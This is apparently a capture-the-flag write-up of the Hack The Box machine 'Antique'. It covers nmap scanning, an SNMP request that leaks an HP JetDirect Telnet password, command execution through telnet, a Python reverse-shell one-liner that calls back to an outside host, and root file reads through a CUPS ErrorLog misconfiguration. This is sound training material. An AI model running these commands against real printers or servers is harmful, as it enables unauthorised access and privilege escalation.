---
title: HTB Antique
date: 2022-08-03 20:55:00 +0800
categories: [HTB, Easy]
tags:
  [
    Network,
    Easy,
    Internal,
    Telnet,
    CVE-2012-5519,
    SNMP,
    HTB,
    snmpwalk,
    nmap,
    CUPS,
  ]
pin: false
---

![Antique](https://www.hackthebox.com/storage/avatars/b966fca9d30da209a90dffad5f390acf.png)

## Reconnaissance/Intelligence Gathering

In this step we collect the target information available in public repositories or sources. We do everything passively.

For HTB machines there is not much to do, just check the name to identify possible ideas.

## Scanning and enumeration

Now it's time to start the active scanning.

As always, we define our TARGET and hosts file of our machine to facilitate the process.

```console
TARGET=<ip_of_the_machine>
sudo nano /etc/hosts # Add a line with the machine IP /t antique.htb
```

We launch a single `TCMP` probe to check ping.

```console
ping -c 1 $TARGET		# => Ping is working
```

### NMAP

To scan the `target` to find open ports and possible vulnerabilities we use `nmap`.

First, simple `TCP` scan without `DNS` resolution and ping discovery, to all the ports and with the version detection.

```console
nmap -n -Pn -sV -p- $TARGET -vvv -oG allPorts
```

We discover that we have a Telnet running in port 23.

```console
# Nmap 7.92 scan initiated Tue Jul 19 15:25:43 2022 as: nmap -n -Pn -sV -p- -T4 -vvv -oG allPorts antique.htb
# Ports scanned: TCP(65535;1-65535) UDP(0;) SCTP(0;) PROTOCOLS(0;)
Host: 10.10.11.107 ()   Status: Up
Host: 10.10.11.107 ()   Ports: 23/open/tcp//telnet?///  Ignored State: closed (65534)
# Nmap done at Tue Jul 19 15:27:23 2022 -- 1 IP address (1 host up) scanned in 99.79 seconds
```

Then we launch the standard scripts in the ports open but nothing shows.

```console
nmap -n -Pn -sVC -p23 $TARGET -oN targeted

```

We can launch a UDP scan.

```console
sudo nmap -n -Pn -sV -sU -p- $TARGET -vvv -oG allPortsUDP
```

We found port 631 open with a `SNMP` service running v1.

```console
# Nmap 7.92 scan initiated Tue Jul 19 15:35:49 2022 as: nmap -n -Pn -sVC -sU -p161 -vvv -oG allPortsUDP antique.htb
# Ports scanned: TCP(0;) UDP(1;161) SCTP(0;) PROTOCOLS(0;)
Host: 10.10.11.107 ()   Status: Up
Host: 10.10.11.107 ()   Ports: 161/open/udp//snmp//SNMPv1 server (public)/
# Nmap done at Tue Jul 19 15:35:57 2022 -- 1 IP address (1 host up) scanned in 8.24 seconds
```

### Telnet

We try to login but a password is required.

```console
Trying 10.10.11.107...
Connected to antique.htb.
Escape character is '^]'.

HP JetDirect

Password:
```

As we can see the machine is HP JetDirect, we launch a searchsploit.

```console
searchsploit JetDirect
```

That shows that we have a possible vulnerability in the SNMP.

```console
HP JetDirect Printer - SNMP JetAdmin Device Password Disclosure                   | hardware/remote/22319.txt
```

### SNMP

Looking at the file we see that the SNMP server is providing the Telnet password by launching an SNMP GET request sending the string.

We launch a simple request with `snmpwalk` to see if the server is responding.

```console
snmpwalk -v 1 -c public 10.10.11.107
```

And the response is correct:

```
iso.3.6.1.2.1 = STRING: "HTB Printer"
```

So we launch the special request that we saw in the searchsploit `txt` considering version 1 and domain public.

```console
snmpwalk -v 1 -c public 10.10.11.107 .1.3.6.1.4.1.11.2.3.9.1.1.13.0
```

The response returns the password in HEX that can be converted in plain text using [CyberChef](https://cyberchef.org).

## Gaining access

We use the password to access using Telnet.

```console
Trying 10.10.11.107...
Connected to antique.htb.
Escape character is '^]'.

HP JetDirect

Password: P@ssw0rd@123!!123

Please type "?" for HELP
> ?

To Change/Configure Parameters Enter:
Parameter-name: value <Carriage Return>

Parameter-name Type of value
ip: IP-address in dotted notation
subnet-mask: address in dotted notation (enter 0 for default)
default-gw: address in dotted notation (enter 0 for default)
syslog-svr: address in dotted notation (enter 0 for default)
idle-timeout: seconds in integers
set-cmnty-name: alpha-numeric string (32 chars max)
host-name: alpha-numeric string (upper case only, 32 chars max)
dhcp-config: 0 to disable, 1 to enable
allow: <ip> [mask] (0 to clear, list to display, 10 max)

addrawport: <TCP port num> (<TCP port num> 3000-9000)
deleterawport: <TCP port num>
listrawport: (No parameter required)

exec: execute system commands (exec id)
exit: quit from telnet session
```

## Internal reconnaissance

As we can see from the help message, We are already authenticated in the telnet service and we can execute commands using `exec`.

```console
exec id # uid=7(lp) gid=7(lp) groups=7(lp),19(lpadmin)
```

So we can obtain the user flag.

```console
    exec cat user.txt
```

To work in a comfortable way we will launch a reverse shell. For reference, I like to use [Reverse Shell Generator](https://www.revshells.com/)

```console
exec python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.13",7890));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("bash")'
```

Once we receive the request we do the treatment as usual.

```console
script /dev/null -c bash
>>> Ctrl+Z
stty raw -echo; fg
reset
xterm
export TERM=xterm
export SHELL=bash
stty columns 54
stty rows 136
```

### Check important files

In `/etc/passwd` we see no users except root with access to a bash or zsh, we can see that the user is a specific user for the printer `lpd`, with no login.

We do some actions

- Check files in the pwd for the user, `/var/spool/lpd`, we found the `telnet.py` script.
- Check for the processes `ps aux`
- Check for the listening ports `netstat -tnlp`

We see that there is a service listening in the port 631

```console
(Not all processes could be identified, non-owned process info
will not be shown, you would have to be root to see it all.)
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
tcp        0      0 127.0.0.1:631           0.0.0.0:*               LISTEN      -
tcp        0      0 0.0.0.0:23              0.0.0.0:*               LISTEN      1026/python3
tcp6       0      0 ::1:631                 :::*                    LISTEN      -
```

Usually this process is a `CUPS` web interface, we can verify by launching a curl request. (If you are running Linux in your machine you might have it also)

```console
curl "http://localhost:631/"
```

## Privilege escalation

A possible way to read server files is using the error log from `CUPS`. Error logs from the CUPS can be accessed using:

```console
curl http://localhost:631/admin/log/error_log
```

`CUPS` runs using root, so it is possible to access root files.

The error log is reading the error file and we can verify it using:

```console
cupsctl
```

We just need to update it...

```console
cupsctl ErrorLog="/root/root.txt"
```

And then, we launch the curl again to see the flag.

## Maintaining access

Not needed as we are talking of a HTB machine...

## Covering tracks

Not needed as we are talking of a HTB machine...
